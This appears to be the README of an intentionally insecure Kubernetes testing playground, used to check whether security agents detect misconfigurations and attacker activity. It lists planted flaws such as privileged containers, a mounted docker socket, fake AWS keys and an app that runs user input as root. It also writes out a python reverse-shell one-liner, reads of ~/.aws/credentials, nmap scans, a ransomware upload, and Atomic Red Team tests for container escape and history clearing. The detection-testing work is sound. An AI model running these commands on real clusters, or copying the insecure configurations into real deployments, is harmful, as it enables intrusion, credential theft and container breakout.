# Insecure Kubernetes Deployments

A repo meant for providing tools for security testing that is comically insecure. Another great tool is [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat), but I wanted more of a playground and less complexity.

## This Repo Contains the following issues:

### General Configuration Issues

1. Busybox is deployed as a long running pod with plenty of dangerous utilities on it
2. Insecure App has fake AWS access keys as env variables, mounts the docker socket, runs in privileged mode, is open on port 8080 and port 22, and binds an SA role with permissions to create more SA roles
3. Workload Security Evaluator contains all the same issues

### Insecure-app

1. Takes raw input as a web form and runs it as root on the server and returns the input to the user
2. Allows for unvalidated file uploads
3. Is running in debug mode
4. Has way more utilities on its Dockerfile than it needs

### Workload-security-evaluator

1. Is forked from [DataDog](https://github.com/DataDog/workload-security-evaluator)
2. Is used for running tests from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Deployment:

1. Create the namespaces `insecure-app` and `workload-security-evaluator`

```
kubectl create namespace insecure-app
kubectl create namespace workload-security-evaluator
```

2. Apply the deployment yamls

```
kubectl apply -f busybox.yaml
kubectl apply -f insecure-app.yaml
kubectl apply -f workload-security-evaluator.yaml
```

3. To test in these pods:

Get pod name, `kubectl get pods -n insecure-app` or `kubectl get pods -n workload-security-evaluator`

For testing insecure-app, run `kubectl port-forward pod/[POD-NAME] 8080:8080 -n insecure-app`. You can now test in your browser at `http://localhost:8080/`

For workload-security-evaluator, run `k exec -it [POD-NAME] -n workload-security-evaluator -- /bin/bash`, then `pwsh` to being invoking tests such as `Invoke-AtomicTest T1105-27 -ShowDetails`

# Testing 

## Misconfigurations

1. AWS creds in env variables
2. SSH port open
3. SA credentials have ability to create new credentials
4. Privileged container
5. Docker socket mounted

## Runtime

1. Run `python3 --version` and `ls -al` via the web form  - detects if it can tell that the python process is running bash commands
2. Run `apt-get update` and `apt-get install hydra -y` - to check for package installs
3. Scan the local port range to look for network detections - `nmap -sS 192.168.1.1-254`
4. Try to spawn a reverse shell
    - bash into workload-security and run `apt-get install netcat`
    - `nc -lvnp 9001`
    - `export RHOST="WORKLOAD-POD-IP";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
5. Check what secrets we might have access to `printenv` and `cat ~/.aws/credentials`
6. Upload ransomware python script `ransomware.py`- this will indicate the level of alerting, if it's new file, python, or specifics about the python
7. Exec into the workload security evaluator pod with `k exec -it [POD-NAME] -n workload-security-evaluator -- /bin/bash`, then `pwsh`
8. `Invoke-AtomicTest T1105-27` - download and run a file
9. `Invoke-AtomicTest T1046-2` - run nmap
10. `Invoke-AtomicTest T1053.003-2` - modify cron jobs
11. `Invoke-AtomicTest T1070.003-1` - clear bash history
12. `Invoke-AtomicTest T1611-1,2` - Container escape
13. Check agent utilization with `k top pod --all-namespaces`

